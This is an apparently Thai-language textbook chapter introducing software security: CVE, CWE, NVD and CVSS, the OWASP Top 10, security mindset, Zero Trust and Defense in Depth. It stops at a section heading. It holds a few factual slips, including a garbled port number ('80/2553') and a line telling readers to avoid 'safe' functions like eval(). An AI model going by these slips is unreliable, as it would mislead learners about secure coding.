# CH-1: บทนําเกี่ยวกับความมั่นคงปลอดภัยของซอฟต์แวร์


---

## วัตถุประสงคการเรียนรู

เมื่อจบบทนี้นักศึกษาสามารถ

1. อธิบายความหมายขอบเขตและความสำคัญของความมั่นคงปลอดภัยของซอฟต์แวร์ในยุคดิจิทัลพรอมยกตัวอยางเหตุการณจริง
2. จําแนกความแตกต่างระหวาง Software Security, Application Security, Network Security และ Information Security ได
3. อธิบายระบบการจําแนกและใหคะแนนช่องโหว่มาตรฐานสากล ไดแก CVE, CWE, NVD และ CVSS
4. ประยุกตใช Security Mindset และหลักการสำคัญในการคิดด้านความปลอดภัย เช่น Defense in Depth, Zero Trust, Assume Breach
5. ระบุประเภทของผูโจมตี ภัยคุกคาม และพื้นผิวการถูกโจมตี (Attack Surface) พรอมแนวทางป้องกัน
6. อธิบายจริยธรรมและกฎหมายที่เกี่ยวของกับการทดสอบความมั่นคงปลอดภัยของซอฟต์แวร์

## เนื้อหา

### 1.1 ภาพรวมและนิยามความมั่นคงปลอดภัยของซอฟต์แวร์

#### 1.1.1 ความหมายและขอบเขตของ Software Security

ความมั่นคงปลอดภัยของซอฟต์แวร์ (Software Security) หมายถึง กระบวนการ แนวปฏิบัติ และเทคโนโลยีที่นํามาใชเพื่อใหแนใจวาซอฟต์แวร์สามารถทํางานไดตามที่ออกแบบไว โดยไมมีช่องโหว่ที่ทําใหเกิดความเสียหายตอข้อมูล ระบบ หรือผูใช ซอฟต์แวร์ที่ "ปลอดภัย" ไมไดหมายถึงซอฟต์แวร์ที่ไมมีช่องโหว่เลย แตหมายถึงซอฟต์แวร์ที่มีการบริหารจัดการความเสี่ยงอยางเหมาะสม และมีมาตรการป้องกันที่เพียงพอตอภัยคุกคามที่คาดการณได

Software Security ครอบคลุมตั้งแต่ขั้นตอนการออกแบบสถาปตยกรรม การเขียนโค้ด การทดสอบ การปรับใช ไปจนถึงการบํารุงรักษาและตอบสนองตอเหตุการณ ซึ่งแตกต่างจากแนวคิดด้านความปลอดภัยอื่นๆ ที่มุงเนนเฉพาะในส่วนใดส่วนหนึ่ง

Software Security มีความสำคัญมากขึ้นเรื่อยๆ เนื่องจากซอฟต์แวร์กลายเป็นส่วนสำคัญของทุกองคกรและทุกชีวิตประจําวันของผู้คน รายงานจาก IBM Cost of a Data Breach Report ป 2025 ระบุวาตนทุนเฉลี่ยของการถูกละเมิดข้อมูลทั่วโลกอยูที่ 4.44 ลานเหรียญสหรัฐตอครั้ง สำหรับสหรัฐอเมริกาอยูที่ 10.22 ลานเหรียญสหรัฐ ซึ่งเป็นคาสูงสุดเป็นประวัติการณ คาใชจายตอหนึ่งระเบียนข้อมูลที่ถูกขโมยเฉลี่ย 173 เหรียญสหรัฐ

**ขอควรจํา:**
- Software Security ครอบคลุมตั้งแต่การออกแบบ การพัฒนา การทดสอบ ไปจนถึงการบํารุงรักษา
- ช่องโหว่ในซอฟต์แวร์เป็นสาเหตุหลักของการถูกละเมิดข้อมูลในปจจุบัน
- ตนทุนเฉลี่ยของการถูกละเมิดข้อมูลทั่วโลกในป 2025 อยูที่ 4.44 ลานเหรียญสหรัฐตอเหตุการณ

**คําถามสำหรับการอภิปรายในชั้นเรียน:** ในชีวิตประจําวันของนักศึกษา มีซอฟต์แวร์ใดบางที่นักศึกษาใชงานและคิดวาอาจมีช่องโหว่ทางความปลอดภัย ทานคิดวาซอฟต์แวร์เหลานั้นควรมีมาตรการป้องกันใดบาง

#### 1.1.2 ความแตกต่างระหวาง Software Security, Application Security, Network Security และ Information Security

แมวาคําศัพทเหลานี้มักถูกใชแทนที่กัน แตมีความหมายและขอบเขตที่ต่างกันดังนี้

- **Software Security** เป็นแนวคิดระดับสงที่มุงเนนความปลอดภัยของซอฟต์แวร์ในทุกขั้นตอนของวงจรการพัฒนาซอฟต์แวร์ (Secure SDLC) รวมถึงการออกแบบสถาปตยกรรม การเขียนโค้ดที่ปลอดภัย การทดสอบความปลอดภัย และการบํารุงรักษา Software Security เป็นหนาที่ของนักพัฒนาซอฟต์แวร์ สถาปนิกซอฟต์แวร์ และวิศวกรความปลอดภัย

- **Application Security (AppSec)** เป็นสาขายอยของ Software Security ที่มุงเนนเฉพาะความปลอดภัยของแอปพลิเคชันที่ทํางานอยู โดยเฉพาะเว็บแอปพลิเคชันและ API AppSec ครอบคลุมการป้องกันช่องโหว่เช่น SQL Injection, XSS, Broken Access Control ซึ่งเป็นหัวขอใน OWASP Top 10

- **Network Security** เป็นการรักษาความปลอดภัยของโครงสรางพื้นฐานเครือขาย โดยใช Firewall, IDS/IPS, VPN, Network Segmentation เป็นตน Network Security ป้องกันการโจมตีที่อาศัยช่องโหว่ในโปรโตคอลเครือขาย แตไมสามารถป้องกันช่องโหว่ในซอฟต์แวร์ได

- **Information Security (InfoSec)** เป็นแนวคิดที่กว้างที่สุด ครอบคลุมการป้องกันข้อมูลทุกรูปแบบทั้งในรูปแบบดิจิทัลและกายภาพ โดยมีเปาหมายเพื่อรักษา CIA Triad (Confidentiality, Integrity, Availability) รวมถึงการกําหนดนโยบาย การบริหารความเสี่ยง และการปฏิบัติตามกฎหมาย

| มิติ | Software Security | Application Security | Network Security | Information Security |
|------|------------------|--------------------|----------------|---------------------|
| ขอบเขต | วงจรชีวิตซอฟต์แวร์ทั้งหมด | แอปพลิเคชันที่ทํางาน | โครงสรางพื้นฐานเครือขาย | ข้อมูลทุกรูปแบบ |
| ผูรับผิดชอบหลัก | นักพัฒนา, DevOps | ทีม AppSec, Pentester | ทีมเครือขาย, SOC | ทีมความปลอดภัย, CISO |
| ตัวอยางมาตรการ | Secure coding, Threat Modeling, Code Review | WAF, DAST, SAST | Firewall, IDS/IPS, VPN | นโยบาย, การบริหารความเสี่ยง |
| จุดเนน | ป้องกันช่องโหว่ตั้งแต่ตนทาง | ตรวจจับและป้องกันขณะรัน | ป้องกันการเขาถึงโดยไมไดรับอนุญาต | ป้องกันข้อมูลรั่วไหล |

**ตัวอยางสถานการณ:** หากเว็บแอปพลิเคชันมีช่องโหว่ SQL Injection:
- Network Security (Firewall) อาจมองไมเห็นเพราะ traffic ไปยังพอร์ต 80/2553 ปกติ
- Application Security (WAF) สามารถบล็อก request ที่มีรูปแบบ SQL Injection
- Software Security ต้องป้องกันตั้งแต่ตอนเขียนโค้ด โดยใช Parameterized Query แทนการตอ string
- Information Security ต้องประเมินวามีข้อมูลสำคัญใดบางที่เสี่ยงตอการรั่วไหลและกําหนดมาตรการจัดการ

**ขอควรจํา:**
- Software Security ครอบคลุมกว้างกวา Application Security และเป็นส่วนหนึ่งของ Information Security
- การรักษาความปลอดภัยแบบแยกส่วนไมเพียงพอ ต้องอาศัยการรวมกําลังกันทุกระดับ
- ซอฟต์แวร์ที่ปลอดภัยต้องเริ่มตนจากการออกแบบ ไมใชการเพิมมาตรการป้องกันทีหลัง

#### 1.1.3 เหตุผลที่ซอฟต์แวร์มช่องโหว่

ช่องโหว่ในซอฟต์แวร์เกิดจากหลายปจจัยหลัก ดังนี้

**1. ความซับซอนของระบบ (Complexity)**
ซอฟต์แวร์ในปจจุบันมีความซับซอนสูงมาก ตัวอยางเช่น
- เบราวเซอร Chrome มีโค้ดมากกวา 30 ลานบรรทัด
- ระบบปฏิบัติการ Windows 11 มีโค้ดประมาณ 50-60 ลานบรรทัด
- แอปพลิเคชันบนมือถือทั่วไปมีโลบราลีของบุคคลที่สาม (Third-party Library) มากกวา 100 ตัว
ความซับซอนหมายถึง จํานวนจุดที่อาจเกิดความผิดพลาดมีจํานวนมากตามไปดวย

**2. ขอจํากัดด้านทรัพยากร (Resource Constraints)**
- ตนทุนและเวลา: ผูบริหารมักกดดันใหสงมอบซอฟต์แวร์เร็ว ทําใหละเลยกระบวนการรักษาความปลอดภัย
- ขาดบุคลากร: มีนักพัฒนาซอฟต์แวร์จํานวนมากแตไมไดรับการอบรมด้านความปลอดภัยอยางเพียงพอ
- งบประมาณ: การลงทุนด้านความปลอดภัยมักถูกมองวาเป็นตนทุนที่ไมจําเป็น

**3. ความผิดพลาดของมนุษย (Human Error)**
- การเขียนโค้ดโดยไมตรวจสอบข้อมูลนําเขาที่เพียงพอ
- การตั้งคาความปลอดภัยผิดพลาด (Misconfiguration)
- การลืมป้องกันฟงกชันที่ละเอียดออน
- การใช API หรือโลบราลีที่ไมปลอดภัย

**4. การใชซอฟต์แวร์คอมโพเนนตจากภายนอก (Third-party Dependencies)**
ซอฟต์แวร์สมัยใหมส่วนใหญอาศัยโอเพนซอรสคอมโพเนนตและโลบราลีจํานวนมาก ปญหาคือ
- โครงการซอฟต์แวร์โดยเฉลี่ยมี third-party dependencies กวา 2,000 ตัว (ข้อมูลจาก Synopsys OSSRA)
- ช่องโหว่ใน dependency ตัวเดียว (เช่น Log4j) สงผลกระทบตอซอฟต์แวร์นับแสนตัวทั่วโลก
- นักพัฒนาไมตระหนักถึงช่องโหว่ใน dependencies ที่ตนใช

**5. ขอผิดพลาดในการออกแบบ (Design Flaws)**
- สถาปตยกรรมที่ไมคํานึงถึงความปลอดภัย
- การออกแบบ Authentication/Authorization ที่ผิดพลาด
- การจัดการ Session และ State ที่ไมปลอดภัย
- การเขารหัสที่ไมถูกต้อง

**6. ภัยคุกคามที่เปลี่ยนแปลงตลอดเวลา (Evolving Threat Landscape)**
- เทคนิคการโจมตีพัฒนาขึ้นทุกวัน
- ช่องโหว่ Zero-day ใหมถูกคนพบอยูเสมอ
- เทคโนโลยีใหมๆ (AI, IoT, Cloud) สรางพื้นผิวการโจมตีใหม

**ตัวอยางจากโลกแหงความเป็นจริง:** ในป 2017 Equifax ซึ่งเป็นหนึ่งในบริษัทข้อมูลสินเชื่อที่ใหญที่สุดในสหรัฐฯ ถูกโจมตีผานช่องโหว่ CVE-2017-5638 ใน Apache Struts ซึ่งเป็นโลบราลีโอเพนซอรสที่ใชในการพัฒนาเว็บแอปพลิเคชัน Java ทั้งที่ทาง Apache ไดออกแพตชป้องกันแลวตั้งแต่เดือนมีนาคม 2017 แต Equifax ไมไดอัปเดต สงผลใหข้อมูลส่วนบุคคลของผูปกครอง 143 ลานรายถูกขโมย คาใชจายทั้งหมดสูงกวา 1.4 พันลานเหรียญสหรัฐ

**ขอควรจํา:**
- ซอฟต์แวร์มีช่องโหว่เพราะซับซอน ถูกจํากัดด้านทรัพยากร และมนุษยผิดพลาด
- การใชโลบราลีภายนอกเพิ่มความเสี่ยงตอ Supply Chain Attack
- การอัปเดตและรักษาความปลอดภัยอยางตอเนื่องเป็นสิ่งจําเป็น ไมใชแคทําตอนพัฒนาเสร็จ

**คําถามสำหรับการอภิปรายในชั้นเรียน:** หากนักศึกษาเป็นผูบริหารบริษัทซอฟต์แวร์แหงหนึ่ง ทานจะจัดสรรงบประมาณและเวลาใหกับความปลอดภัยอยางไรในขณะที่ต้องสงมอบซอฟต์แวร์ตามกําหนดการ

### 1.2 ระบบการจําแนกและใหคะแนนช่องโหว่มาตรฐานสากล

ในวงการความมั่นคงปลอดภัยทางไซเบอร มีมาตรฐานสากลที่สำคัญ 4 ระบบที่นักศึกษาต้องรูจัก ไดแก CVE, CWE, NVD และ CVSS

#### 1.2.1 CVE (Common Vulnerabilities and Exposures)

CVE เป็นระบบบัญชีรายชื่อช่องโหว่ด้านความปลอดภัยที่เป็นที่รูจักตอสาธารณะ ดําเนินการโดยองคกร MITRE โดยไดรับการสนับสนุนจาก Cybersecurity and Infrastructure Security Agency (CISA) ของสหรัฐอเมริกา

**โครงสรางของ CVE ID:**
CVE-ID มีรูปแบบเป็น CVE-ปจจุบัน-เลขที่ ตัวอยางเช่น
- CVE-2017-5638 (Apache Struts Remote Code Execution - Equifax)
- CVE-2021-44228 (Log4Shell)
- CVE-2023-34362 (MOVEit SQL Injection)

CVE แตละรายการประกอบดวย
1. CVE ID: หมายเลขประจําตัวที่ไมซ้ํากัน
2. คําอธิบาย: บรรยายสั้นๆ วาช่องโหว่คืออะไร
3. References: ลิงกไปยังแหลงอางอิง เช่น Vendor Advisory, Patch Notes
4. Date: วันที่ประกาศ (Published Date), วันแกไข (Last Modified)

CVE ID จะถูกกําหนดโดย CVE Numbering Authority (CNA) ซึ่งเป็นองคกรที่ไดรับอนุญาตจาก MITRE ใหกําหนด CVE ID ในขอบเขตของตน เช่น Microsoft, Oracle, Google, Apache Software Foundation

**สิ่งที่ CVE ไมใช:**
- CVE ไมไดบอกความรุนแรงของช่องโหว่
- CVE ไมไดประเมินผลกระทบตอระบบของทาน
- CVE เป็นแค "ปาย" ระบุตัวตนของช่องโหว่ ไมใชรายงานฉบับสมบูรณ

**ความสำคัญของ CVE:**
- ใชเป็นภาษากลางในการอางอิงถึงช่องโหว่เดียวกันในทุกระบบ
- ชวยใหทีมรักษาความปลอดภัยและเครื่องมือต่างๆ สามารถอางอิงถึงช่องโหว่เดียวกันไดอยางถูกต้อง
- เป็นพื้นฐานสำหรับการจัดการช่องโหว่ (Vulnerability Management)

#### 1.2.2 CWE (Common Weakness Enumeration)

CWE เป็นระบบจําแนกประเภทของจุดออน (Weakness) ในซอฟต์แวร์และฮารดแวรที่อาจนําไปสูช่องโหว่ด้านความปลอดภัย CWE ก็ดําเนินการโดย MITRE เช่นเดียวกัน

**ความแตกต่างระหวาง CVE และ CWE:**

| มิติ | CVE | CWE |
|------|-----|-----|
| ตอบคําถาม | ช่องโหว่นี้คืออะไร (What) | จุดออนประเภทไหนที่ทําใหเกิด (Why) |
| ระดับ | เฉพาะเจาะจง (Specific instance) | ทั่วไป (Category/Taxonomy) |
| ตัวอยาง | CVE-2021-44228 เป็นช่องโหว่ใน Log4j version 2.x | CWE-917: Improper Neutralization of Special Elements used in Expression Language Statement |
| การใชงาน | ระบุและติดตามช่องโหว่ | ป้องกันและแกไขที่ตนเหตุ |

**ตัวอยาง CWE-ID ที่พบบอย:**
- CWE-79: Cross-site Scripting (XSS)
- CWE-89: SQL Injection
- CWE-287: Improper Authentication
- CWE-200: Exposure of Sensitive Information
- CWE-502: Deserialization of Untrusted Data
- CWE-20: Improper Input Validation
- CWE-798: Use of Hard-coded Credentials
- CWE-269: Improper Privilege Management

**การนํา CWE ไปใชประโยชน:**
- ทีมพัฒนาสามารถนํา CWE ไปสราง "Secure Coding Guidelines" ที่จําเพาะกับภาษาหรือเฟรมเวิรกที่ตนใช
- สามารถกําหนดกฎใน SAST Tool (เช่น Semgrep, CodeQL) เพื่อตรวจจับรูปแบบโค้ดที่ตรงกับ CWE ที่ต้องการป้องกัน
- การฝกอบรมนักพัฒนาสามารถเนนไปที่ CWE ที่พบบอยในองคกร

---

#### 1.2.3 NVD (National Vulnerability Database)

NVD คือคลังข้อมูลช่องโหว่แหงชาติของสหรัฐอเมริกา ดําเนินการโดย National Institute of Standards and Technology (NIST) ทําหนาที่ "เติมเต็ม" ข้อมูลใน CVE ใหสมบูรณยิ่งขึ้น โดยเพิ่ม

1. **คะแนน CVSS**: ใหคะแนนความรุนแรง (Severity Score)
2. **CWE Mapping**: โยงไปยังประเภทของจุดออน
3. **CPE (Common Platform Enumeration)**: ระบุผลิตภัณฑและเวอรชันที่ไดรับผลกระทบ
4. **Reference Tags**: แท็กประเภทของลิงกอางอิง (Patch, Exploit, Vendor Advisory)

ดังนั้น CVE และ NVD ทํางานเสริมกัน
- CVE บอกวาช่องโหว่คืออะไร
- NVD บอกวามีความรุนแรงแคไหน และกระทบผลิตภัณฑใดบาง

---

#### 1.2.4 CVSS (Common Vulnerability Scoring System)

CVSS เป็นมาตรฐานเปดสำหรับการใหคะแนนความรุนแรงของช่องโหว่ทางไซเบอร พัฒนาโดย FIRST.org (Forum of Incident Response and Security Teams) ปจจุบันเวอรชันลาสุดคือ CVSS v4.0

**องคประกอบของคะแนน CVSS:**

คะแนน CVSS ประกอบดวย Metric Groups หลัก 3 กลุม (ใน v3.x):

**1. Base Metrics (คะแนนพื้นฐาน)**
- Attack Vector (AV): ชองทางการโจมตี (Network, Adjacent, Local, Physical)
- Attack Complexity (AC): ความซับซอนในการโจมตี (Low, High)
- Privileges Required (PR): สิทธิที่ต้องการ (None, Low, High)
- User Interaction (UI): ต้องการปฏิสัมพันธกับผูใชหรือไม (None, Required)
- Scope (S): การลามไปยังคอมโพเนนตอื่น (Unchanged, Changed)
- Confidentiality Impact (C): ผลกระทบตอความลับ (None, Low, High)
- Integrity Impact (I): ผลกระทบตอความถูกต้อง
- Availability Impact (A): ผลกระทบตอความพรอมใชงาน

**2. Temporal Metrics (คะแนนตามเวลา)**
- Exploit Code Maturity: มีโค้ดโจมตีพรอมใชหรือไม
- Remediation Level: มีวิธีแกไขแลวหรือยัง
- Report Confidence: ระดับความนําเชื่อถือของรายงาน

**3. Environmental Metrics (คะแนนตามสภาพแวดลอม)**
- ปรับแตงตามความสำคัญของข้อมูลในองคกรนั้นๆ
- ทําใหคะแนนสะทอนความเสี่ยงจริงของแตละองคกรไดดีขึ้น

**ระดับคะแนน CVSS:**

| ระดับความรุนแรง | คะแนน CVSS v3 |
|----------------|----------------|
| None | 0.0 |
| Low | 0.1 - 3.9 |
| Medium | 4.0 - 6.9 |
| High | 7.0 - 8.9 |
| Critical | 9.0 - 10.0 |

**ตัวอยางการคํานวณ CVSS:**
Log4Shell (CVE-2021-44228) มีคะแนน CVSS v3.1 = 10.0 (Critical)
Vector string: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

แปลความหมาย:
- AV:N = โจมตีผาน Network ไดจากระยะไกล
- AC:L = ความซับซอนต่ํา
- PR:N = ไมต้องการสิทธิใดๆ
- UI:N = ไมต้อง interaction จากผูใช
- S:C = สงผลกระทบตอระบบอื่น
- C:H/I:H/A:H = ผลกระทบสูงตอความลับ ความถูกต้อง และความพรอมใชงาน

ดังนั้น Log4Shell จึงเป็นช่องโหว่ที่ "สมบูรณแบบ" สำหรับผูโจมตี คือโจมตีงาย ไมต้องสิทธิ์ และควบคุมระบบไดทั้งหมด

**ขอควรจําเกี่ยวกับ CVSS:**
- CVSS วัดความรุนแรง (Severity) ไมใชความเสี่ยง (Risk)
- คะแนนเดียวกัน แตบริบทต่างกัน อาจมีความเสี่ยงต่างกัน
- CVSS 10.0 ในระบบที่ไมไดเชื่อมตออินเทอรเน็ตอาจมีความเสี่ยงต่ํากวา CVSS 7.5 ในระบบที่เปดสูสาธารณะ

**คําถามสำหรับการอภิปรายในชั้นเรียน:** ทานคิดวาการใชคะแนน CVSS เพียงอยางเดียวในการจัดลําดับความสำคัญของการแพตชซอฟต์แวร์มีขอจํากัดอยางไรบาง

### 1.3 สถิติและแนวโนมการโจมตีซอฟต์แวร์

#### 1.3.1 ข้อมูลสถิติช่องโหว่

ข้อมูลจาก National Vulnerability Database (NVD) แสดงแนวโนมการเพิ่มขึ้นของช่องโหว่ที่ไดรับการเปดเผยอยางตอเนื่อง

**จํานวน CVE ที่ถูกเผยแพรตอป (โดยประมาณ):**
- ป 2019: ประมาณ 17,000 CVE
- ป 2020: ประมาณ 18,000 CVE
- ป 2021: ประมาณ 20,000 CVE
- ป 2022: ประมาณ 25,000 CVE
- ป 2023: มากกวา 26,000 CVE
- ป 2024: มากกวา 30,000 CVE

แนวโนมเพิ่มขึ้นประมาณรอยละ 10-15 ตอป แสดงใหเห็นวาจํานวนช่องโหว่ในซอฟต์แวร์เพิ่มขึ้นอยางตอเนื่อง ซึ่งเป็นผลมาจากการเพิ่มขึ้นของโค้ดและคอมโพเนนตที่ใชในซอฟต์แวร์

**OWASP Top 10 (2021) คืออะไร**
OWASP Top 10 เป็นรายงานของ OWASP (Open Web Application Security Project) ที่รวบรวม 10 ช่องโหว่ที่พบมากที่สุดในเว็บแอปพลิเคชัน โดยอัปเดตทุก 3-4 ป ประกอบดวย

1. Broken Access Control (การควบคุมการเขาถึงที่บกพรอง)
2. Cryptographic Failures (การเขารหัสที่ผิดพลาด)
3. Injection (SQL, NoSQL, Command Injection)
4. Insecure Design (การออกแบบที่ไมปลอดภัย)
5. Security Misconfiguration (การตั้งคาความปลอดภัยที่ผิดพลาด)
6. Vulnerable and Outdated Components (คอมโพเนนตที่ไมปลอดภัย)
7. Identification and Authentication Failures (การพิสูจนและยืนยันตัวตนที่บกพรอง)
8. Software and Data Integrity Failures (ความถูกต้องของซอฟต์แวร์และข้อมูล)
9. Security Logging and Monitoring Failures (การบันทึกและเฝาระวังที่บกพรอง)
10. Server-Side Request Forgery (SSRF)

### 1.4 Security Mindset และหลักคิดด้านความปลอดภัย

#### 1.4.1 Attack vs Defense Thinking

Security Mindset หมายถึง วิธีคิดและมุมมองที่คํานึงถึงความปลอดภัยเป็นสำคัญ โดยเฉพาะอยางยิ่งการคิดในมุมของผูโจมตี (Adversarial Thinking) ซึ่งเป็นทักษะที่สำคัญสำหรับผูที่ทํางานด้านความมั่นคงปลอดภัยของซอฟต์แวร์

**การคิดแบบป้องกัน (Defense Thinking):**
- มุงเนมวิธีการป้องกันระบบ
- ถามวา "ฉันจะทําใหระบบนี้ปลอดภัยไดอยางไร"
- มักคิดในกรอบของฟงกชันที่ระบบควรทํา
- ตัวอยาง: "ฉันจะใสการตรวจสอบสิทธิ์ในทุก API endpoint"

**การคิดแบบรุก (Attack Thinking หรือ Adversarial Thinking):**
- มุงเนมการหาจุดออนของระบบ
- ถามวา "ฉันจะโจมตีระบบนี้ดวยวิธีใดไดบาง"
- คิดนอกกรอบและพยายามหาวิธีที่ระบบทํางานผิดเพี้ยนไป
- ตัวอยาง: "ถาฉันสงคาพิเศษใน HTTP header แทนพารามิเตอร์ปกติ จะเกิดอะไรขึ้น"

**ทําไม Security Mindset จึงสำคัญ:**
เพราะนักพัฒนาที่คิดแตแบบป้องกันมักมองไมเห็นวาระบบของตนมีช่องโหว่ตรงไหน ในขณะที่ผูโจมตีจะใชเวลาคนหาจุดออนเหลานั้นตลอดเวลา การมี Security Mindset ชวยใหนักพัฒนาสามารถ "คิดแบบแฮกเกอร" และป้องกันช่องโหว่ไดตั้งแต่กอนเขียนโค้ด

**ตัวอยาง Security Mindset ในการพัฒนา:**
- เมื่อเขียนฟงกชันรับไฟลอัปโหลด ใหคิดวา "จะเกิดอะไรขึ้นถาผูใชสงไฟลขนาด 100 GB" หรือ "ถาสงไฟลที่มีนามสกุล .exe แทน .jpg"
- เมื่อออกแบบระบบ Authentication ใหคิดวา "จะเกิดอะไรขึ้นถาผูโจมตีพยายาม login 1000 ครั้งตอวินาที"
- เมื่อใชโลบราลีภายนอก ใหคิดวา "จะเกิดอะไรขึ้นถาโลบราลีนี้มีช่องโหว่ หรือผูดูแลเลิกพัฒนาตอ"

#### 1.4.2 หลักการ Assume Breach และ Zero Trust

**Assume Breach (สมมติวาถูกเจาะแลว)**
เป็นแนวคิดที่เปลี่ยนสมมติฐานจากการ "พยายามไมใหถูกเจาะ" เป็น "สมมติวาถูกเจาะไปแลว" และออกแบบระบบใหสามารถจํากัดความเสียหายไดแมจะถูกโจมตีแลวก็ตาม

หลักการนี้สงผลใหองคกรต้องมีมาตรการดังนี้
- การแบงส่วนเครือขาย (Network Segmentation) เพื่อจํากัดการลามของการโจมตี (Lateral Movement)
- การตรวจสอบและเฝาระวังอยางตอเนื่อง (Continuous Monitoring)
- การเขารหัสข้อมูลทั้งขณะจัดเก็บ (At Rest) และขณะสง (In Transit)
- การใชหลัก Least Privilege ใหสิทธิ์เทาที่จําเป็น
- การมีแผนตอบสนองตอเหตุการณ (Incident Response Plan) ที่พรอมใชงาน

**Zero Trust (ความไววางใจเป็นศูนย)**
Zero Trust เป็นกรอบแนวคิดด้านความปลอดภัยที่กลาววา "อยาไววางใจใคร ใหตรวจสอบเสมอ" โดยยกเลิกแนวคิดเดิมที่เชื่อวาเครือขายภายในองคกรปลอดภัย

หลักการสำคัญของ Zero Trust:
1. **Verify Explicitly**: ตรวจสอบตัวตนและสิทธิ์ทุกครั้งที่มีการขอเขาถึง ไมวาจะมาจากที่ไหน
2. **Use Least Privilege Access**: ใหสิทธิ์นอยที่สุดเทาที่จําเป็นตอการทํางาน
3. **Assume Breach**: สมมติวาถูกเจาะแลวและออกแบบใหจํากัดความเสียหาย

Zero Trust ประกอบดวยแนวทางสำคัญหลายประการ
- Micro-segmentation: แบงเครือขายออกเป็นส่วนยอยๆ
- Multi-factor Authentication (MFA): ใชการยืนยันตัวตนหลายขั้นตอน
- Continuous monitoring and analytics: เฝาระวังและวิเคราะหพฤติกรรมอยางตอเนื่อง
- Automation: ใชระบบอัตโนมัติในการตอบสนองตอภัยคุกคาม

#### 1.4.3 การตัดสินใจภายใต Trade-offs

ในโลกแหงความเป็นจริง ไมมีระบบใดที่ปลอดภัย 100% เพราะต้องคํานึงถึงปจจัยอื่นๆ ที่ขัดแยงกัน การตัดสินใจด้านความปลอดภัยจึงต้องมีการประนีประนอมระหวาง

**1. Security vs Usability (ความปลอดภัย vs ความสะดวกในการใชงาน)**
- ยิ่งใสมาตรการรักษาความปลอดภัยมากเทาไหร ผูใชยิ่งใชงานยากขึ้นเทานั้น
- ตัวอยาง: การใส MFA ทําใหปลอดภัยขึ้นแตผูใชต้องใชเวลามากขึ้นในการเขาสูระบบ
- การกําหนดใหเปลี่ยนรหัสผานทุก 30 วัน ทําใหผูใชจํารหัสผานไมไดและต้องจดไว

**2. Security vs Cost**
- การลงทุนด้านความปลอดภัยมีคาใชจายทั้งในด้านเครื่องมือ บุคลากร และเวลา
- งบประมาณที่จํากัดทําใหต้องเลือกวาจะป้องกันส่วนไหนกอน
- ROI (Return on Investment) ด้านความปลอดภัยวัดไดยากเพราะเป็นการป้องกันสิ่งที่ยังไมเกิด

**3. Security vs Performance**
- การเขารหัสข้อมูล การตรวจสอบความปลอดภัย และ logging ทําใหระบบทํางานชาลง
- Firewall และ IDS/IPS ที่ตรวจสอบ traffic ทั้งหมดอาจกลายเป็นคอขวด

**การตัดสินใจที่ดี:**
ต้องอาศัยการบริหารความเสี่ยง (Risk Management) โดย
1. ประเมินมูลคาของทรัพยากรที่ต้องป้องกัน (Asset Value)
2. ประเมินโอกาสที่จะถูกโจมตี (Likelihood)
3. ประเมินผลกระทบหากถูกโจมตีสําเร็จ (Impact)
4. เลือกมาตรการที่เหมาะสมกับระดับความเสี่ยง (Risk Treatment)

**ตัวอยางจากชีวิตจริง:**
ธนาคารออนไลน์มักกําหนดใหผูใชต้องใส OTP (One-Time Password) ทุกครั้งที่โอนเงินจํานวนมาก ซึ่งสรางความไมสะดวกแตชดเชยดวยความปลอดภัยที่สูงขึ้น ในทางกลับกัน การเขาดูประวัติการใชงานอาจไมต้อง OTP เพราะข้อมูลมีความออนไหวนอยกวา

---

#### 1.4.4 หลักการ Defense in Depth

Defense in Depth หรือ "การป้องกันแบบหลายชั้น" เป็นหลักการด้านความปลอดภัยที่ไมพึ่งพามาตรการป้องกันเพียงชั้นเดียว แตสรางกาแพงหลายชั้นเพื่อใหแนใจวาแมมาตรการหนึ่งจะถูกโจมตีสําเร็จ ก็ยังมีมาตรการอื่นปกปองอยู

ตัวอยางการป้องกันแบบ Defense in Depth สำหรับเว็บแอปพลิเคชัน

**ชั้นที่ 1 - Security Requirements (ขอต้องการด้านความปลอดภัย)**
กําหนดตั้งแต่ตอนออกแบบวาแอปพลิเคชันต้องมีมาตรการอะไรบาง เช่น ต้องมี MFA, ต้องเขารหัสข้อมูลผูใช, ต้องมี Audit Log

**ชั้นที่ 2 - Secure Coding (การเขียนโค้ดที่ปลอดภัย)**
- ใช Parameterized Query ป้องกัน SQL Injection
- ใช Input Validation สำหรับทุกข้อมูลที่รับจากผูใช
- ใช Output Encoding ป้องกัน XSS
- หลีกเลี่ยงการใชฟงกชันที่ปลอดภัย (เช่น eval())

**ชั้นที่ 3 - Static Application Security Testing (SAST)**
วิเคราะหโค้ดตนฉบับเพื่อหาช่องโหว่ตั้งแต่กอนคอมไพล โดยเครื่องมืออยาง SonarQube, Semgrep, CodeQL

**ชั้นที่ 4 - Dependency Scanning (SCA)**
สแกนโลบราลีและ Third-party Components เพื่อหาช่องโหว่ที่รูจัก โดยเครื่องมืออยาง Trivy, Snyk, OWASP Dependency-Check

**ชั้นที่ 5 - Web Application Firewall (WAF)**
กรองและบล็อก request ที่เป็นอันตรายกอนถึงเซิรฟเวอร เช่น ModSecurity, AWS WAF, Cloudflare WAF

**ชั้นที่ 6 - Dynamic Application Security Testing (DAST)**
ทดสอบแอปพลิเคชันขณะทํางานจริงเพื่อหาช่องโหว่ที่อาจไมถูกตรวจพบใน SAST โดยเครื่องมืออยาง OWASP ZAP, Burp Suite

**ชั้นที่ 7 - Security Monitoring (การเฝาระวัง)**
ตรวจจับพฤติกรรมผิดปกติขณะระบบทํางาน ดวย SIEM (Security Information and Event Management), IDS/IPS

**ชั้นที่ 8 - Incident Response (การตอบสนองตอเหตุการณ)**
มีแผนและทีมพรอมรับมือเมื่อเกิดเหตุการณความปลอดภัย รวมถึงการกูระบบ (Disaster Recovery) และการสอบสวน (Forensics)

**ขอควรจํา:**
- ไมมีมาตรการใดที่สามารถป้องกันการโจมตีไดทุกชนิด
- Defense in Depth เป็นการสรางกาแพงหลายชั้น ไมใชพึ่งพามาตรการเดียว
- ยิ่งชั้นมาก ยิ่งใชทรัพยากรมาก แตก็ยิ่งปลอดภัย
- การป้องกันที่ดีต้องครอบคลุมทั้งในส่วนของกระบวนการ เทคโนโลยี และบุคลากร

**คําถามสำหรับการอภิปรายในชั้นเรียน:** ในฐานะนักพัฒนาซอฟต์แวร์ ทานคิดวาชั้นใดใน Defense in Depth ที่สำคัญที่สุด เพราะเหตุใด

---

### 1.5 ประเภทของภัยคุกคามและผูโจมตี

#### 1.5.1 การแบงประเภทแฮกเกอรตามจริยธรรมและกฎหมาย

